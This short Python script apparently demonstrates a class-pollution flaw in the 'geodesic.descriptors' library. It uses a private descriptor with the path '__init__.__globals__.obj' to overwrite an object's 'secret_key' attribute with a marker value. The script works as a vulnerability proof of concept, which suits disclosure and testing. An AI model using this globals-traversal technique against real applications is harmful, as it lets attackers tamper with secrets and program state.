import geodesic.descriptors as descriptors
import random

class Animal:
  secret_key = "secret_key"
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)

obj = Animal('cat', 11)

desc = descriptors._BaseDescr("__init__.__globals__.obj")
desc.__set_name__(name="secret_key", owner=None)
desc._set_object(obj, "polluted")

print(obj.secret_key)